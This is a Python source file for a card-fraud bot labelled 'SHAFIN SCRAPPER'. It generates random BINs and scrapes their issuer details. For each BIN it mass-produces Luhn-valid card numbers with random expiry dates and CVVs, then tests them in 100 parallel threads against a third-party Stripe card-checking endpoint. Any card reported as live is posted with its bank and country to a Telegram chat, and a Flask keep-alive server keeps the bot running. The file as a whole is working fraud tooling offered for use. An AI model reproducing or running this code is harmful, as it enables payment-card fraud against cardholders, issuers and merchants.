import random
from datetime import datetime
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
from urllib3.exceptions import InsecureRequestWarning
import logging
import os
from flask import Flask
from threading import Thread
import time

app = Flask(__name__)

@app.route('/', methods=['GET'])
def home():
    return "Welcome to the Scraper! It's running!"

def run_scraper_in_background():
    while True:
    
        pass

warnings.simplefilter('ignore', InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            logging.info("Message posted to Telegram successfully.")
        else:
            logging.error(f"Failed to post message to Telegram: {response.status_code}")
    except requests.RequestException as e:
        logging.error(f"Error posting message to Telegram: {e}")

def get_country_emoji(country_name):
    url = "https://cdn.jsdelivr.net/npm/country-flag-emoji-json@2.0.0/dist/index.json"
    response = requests.get(url)
    if response.status_code != 200:
        logging.error(f"Failed to fetch country emojis: {response.status_code}")
        return ""
    data = response.json()
    country_name_normalized = country_name.strip().lower()
    mappings = {
        "viet nam": "vietnam",
        "korea, republic of": "south korea",
        "russian federation": "russia",
        "czech republic": "czechia",
        "taiwan, province of china": "taiwan",
        "swaziland": "swaziland",
        "bolivia, plurinational state of": "bolivia",
        "libyan arab jamahiriya": "libya",
        "hong kong": "hong kong",
        "venezuela, bolivarian republic of": "venezuela",
        "saint kitts and nevis": "saint kitts and nevis",
        "saint lucia": "saint lucia",
        "macedonia, the former yugoslav republic of": "macedonia",
        "sint maarten (dutch part)": "sint maarten",
        "trinidad and tobago": "trinidad and tobago",
        "palestinian territory, occupied": "palestinian territory",
        "bosnia and herzegovina": "bosnia and herzegovina",
        "cote d'ivoire": "ivory coast",
        "kosovo, republic of": "kosovo",
        "tanzania, united republic of": "tanzania",
        "moldova, republic of": "moldova",
        "syrian arab republic": "syria",
        "turks and caicos islands": "turks and caicos islands",
        "brunei darussalam": "brunei",
        "saint vincent and the grenadines": "saint vincent and the grenadines",        "macao": "macao","democratic republic of the congo": "democratic republic of the congo"
    }
    country_name_normalized = mappings.get(country_name_normalized, country_name_normalized)
    for country in data:
        if country_name_normalized == country['name'].lower():
            return country['emoji']
    logging.warning(f"No emoji found for country: {country_name}")
    return ""

def simplify_card_brand(card_brand):
    if card_brand == "AMERICAN EXPRESS":
        return "AMEX"
    return card_brand

def luhn_checksum(card):
    def digits_of(n):
        return [int(d) for d in str(n)]
    def sum_arr(arr):
        return sum(arr)
    digits = digits_of(card)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum_arr(odd_digits)
    for d in even_digits:
        checksum += sum_arr(digits_of(d * 2))
    return checksum % 10

def is_luhn_valid(card):
    return luhn_checksum(card) == 0

def generate_card(bin):
    while True:
        remaining_length = 16 - len(bin) - 1
        card_number = bin + ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
        check_digit = 0
        for i in range(10):
            if is_luhn_valid(card_number + str(i)):
                check_digit = i
                break
        card_number += str(check_digit)
        if len(card_number) == 16 and is_luhn_valid(card_number):
            return card_number

def generate_expiry():
    now = datetime.now()
    current_year = now.year
    current_month = now.month
    year = random.randint(current_year, current_year + 6)
    if year == current_year:
        month = random.randint(current_month, 12)
    else:
        month = random.randint(1, 12)
    return str(month).zfill(2), str(year)

def generate_cvv():
    return str(random.randint(100, 999)).zfill(3)

def generate_cards(bin, quantity=100):
    cards = []
    for _ in range(quantity):
        card_number = generate_card(bin)
        month, year = generate_expiry()
        cvv = generate_cvv()
        cards.append(f"{card_number}|{month}|{year}|{cvv}")
    return cards

def check_card(card):
    card_number, exp_month, exp_year, cvv = card.split('|')
    url = f"https://test.infinitemsfeed.com/bots/Mod_By_Kamal/stripe.php?lista={card_number}|{exp_month}|{exp_year}|{cvv}"
    headers = { 
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
    }
    try:
        response = requests.get(url, headers=headers, allow_redirects=False)
        if response.status_code == 200 and "json" in response.headers["Content-Type"]:
            data = response.json()
            if "ccNumber" in data and data["status"] == "Live":
                return f"{card_number}|{exp_month}|{exp_year}|{cvv}"
    except requests.RequestException as e:
        logging.error(f"Error checking card {card}: {e}")
    return None

def check_bin(bin_number):
    url = f"https://bincheck.io/details/{bin_number}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'
    }
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            try:
                bin_number = soup.find(string="BIN/IIN").find_next('td').text.strip()
                card_brand = soup.find(string="Card Brand").find_next('td').text.strip()
                card_type = soup.find(string="Card Type").find_next('td').text.strip()
                card_level = soup.find(string="Card Level").find_next('td').text.strip()
                issuer_name = soup.find(string="Issuer Name / Bank").find_next('td').text.strip()
                country = soup.find(string="ISO Country Name").find_next('td').text.strip()
                country = country.strip().lower()

                if not (card_brand and card_type and card_level and issuer_name and country) or \
                   '------' in [card_brand, card_type, card_level, issuer_name]:
                    logging.info(f"Invalid data for BIN {bin_number}. Skipping.")
                    return

                country_mappings = {
"viet nam": "VIETNAM",
                    "korea, republic of": "SOUTH KOREA",
                    "russian federation": "RUSSIA",
                    "czech republic": "CZECH REPUBLIC 🇨🇿",
                    "taiwan, province of china": "TAIWAN",
                    "swaziland": "SWAZILAND 🇸🇿",
                    "bolivia, plurinational state of": "BOLIVIA",
                    "libyan arab jamahiriya": "LIBYA",
                    "hong kong": "HONG KONG 🇭🇰",
                    "venezuela, bolivarian republic of": "VENEZUELA",
                    "saint kitts and nevis": "SAINT KITTS AND NEVIS 🇰🇳",
                    "saint lucia": "SAINT LUCIA 🇱🇨",
                    "macedonia, the former yugoslav republic of": "MACEDONIA 🇲🇰",
                    "sint maarten (dutch part)": "SINT MAARTEN",
                    "trinidad and tobago": "TRINIDAD AND TOBAGO 🇹🇹",
                    "palestinian territory, occupied": "PALESTINIAN TERRITORY 🇵🇸",
                    "bosnia and herzegovina": "BOSNIA AND HERZEGOVINA 🇧🇦",
                    "cote d'ivoire": "IVORY COAST 🇨🇮",
                    "kosovo, republic of": "KOSOVO",
                    "tanzania, united republic of": "TANZANIA",
                    "moldova, republic of": "MOLDOVA",
                    "syrian arab republic": "SYRIA",
                    "turks and caicos islands": "TURKS AND CAICOS ISLANDS 🇹🇨",
                    "brunei darussalam": "BRUNEI 🇧🇳",
                    "saint vincent and the grenadines": "SAINT VINCENT AND THE GRENADINES 🇻🇨",
                    "macao": "MACAO 🇲🇴","democratic republic of the congo": "DEMOCRATIC REPUBLIC OF THE CONGO 🇨🇩"
                }
                country = country_mappings.get(country.strip().lower(), country)
                simplified_brand = simplify_card_brand(card_brand)
                emoji = get_country_emoji(country)
              
                message = (
                    "╭────────────────────╮\n"
                    "   ⚡ SHAFIN SCRAPPER ⚡     \n"
                    "╰────────────────────╯\n"
                )

                generated_cards = generate_cards(bin_number, 100)
                valid_card_found = False
                with ThreadPoolExecutor(max_workers=100) as executor:
                    future_to_card = {executor.submit(check_card, card): card for card in generated_cards}
                    for future in as_completed(future_to_card):
                        live_card = future.result()
                        if live_card:
                            valid_card_found = True

                            card_number, exp_month, exp_year, cvv = live_card.split('|')
                          
                            exp_year_short = exp_year[-2:]
                          
                            extrap_card = f"{card_number[:12]}xxxx|{exp_month}|{exp_year_short}|rnd"                                                   
                            live_message = (
                                f"{message}"
                                f"𝐂𝐀𝐑𝐃: `{card_number}|{exp_month}|{exp_year_short}|{cvv}`\n\n"
                                f"𝐄𝐗𝐓𝐑𝐀𝐏: `{extrap_card}`\n\n"
                                f"𝐁𝐈𝐍: `{bin_number}`\n\n"
                                f"𝐂𝐎𝐔𝐍𝐓𝐑𝐘: `{country.upper()}` {emoji}\n\n"
                                f"𝐈𝐒𝐒𝐔𝐄𝐑: `{issuer_name}`\n\n"
                                f"𝐈𝐍𝐅𝐎: `{simplified_brand}` - `{card_type}` - `{card_level}`\n\n"
                                "╰                                                            ╯"
                            )

                            send_to_telegram(live_message)
                            break

                if not valid_card_found:
                    logging.info(f"No valid cards found for BIN {bin_number}.")

            except AttributeError as e:
                logging.error(f"Error parsing BIN details for {bin_number}: {e}")
    except requests.RequestException as e:
        logging.error(f"Error fetching BIN details for {bin_number}: {e}")

def generate_bins():
    bins = []
    for _ in range(150):
        bin = '5' + ''.join(random.choices('0123456789', k=5))
        bins.append(bin)
    for _ in range(150):
        bin = '4' + ''.join(random.choices('0123456789', k=5))
        bins.append(bin)
    return bins

def fetch_bin_details(bins):
    bin_list = '%0D%0A'.join(bins)
    url = f"https://bins.ws/search?bins={bin_list}&bank=&country="
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    rows = soup.select("table tbody tr")
    return rows

def extract_bins(rows):
    bins_starting_with_4 = []
    bins_starting_with_5 = []
    for row in rows:
        cells = row.find_all("td")
        if len(cells) >= 6:
            bin_number = cells[0].text.strip()
            card_type = cells[1].text.strip()
            brand = cells[2].text.strip()
            bank = cells[3].text.strip()
            country = cells[4].text.strip()
            if bin_number and card_type and brand and bank and country:
                if bin_number.startswith('4'):
                    bins_starting_with_4.append(bin_number)
                elif bin_number.startswith('5'):
                    bins_starting_with_5.append(bin_number)
        if len(bins_starting_with_4) >= 150 and len(bins_starting_with_5) >= 150:
            break
    return bins_starting_with_4, bins_starting_with_5

def run_scraper_in_background():
    while True:
        bins = generate_bins()
        rows = fetch_bin_details(bins)
        bins_4, bins_5 = extract_bins(rows)
        bins_4 = bins_4[:150]
        bins_5 = bins_5[:150]
        for bin_4, bin_5 in zip(bins_4, bins_5):
            check_bin(bin_4)
            check_bin(bin_5)
            logging.info("Scraper cycle completed. Sleeping for a bit before the next run.")
        time.sleep(10)
                                       
def run():
    app.run(host="0.0.0.0", port=int(os.getenv('PORT', 8080)))

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()

def main():
    keep_alive()
    
    scraper_thread = Thread(target=run_scraper_in_background)
    scraper_thread.daemon = True  
    scraper_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("Shutting down gracefully...")

if __name__ == "__main__":
    main()
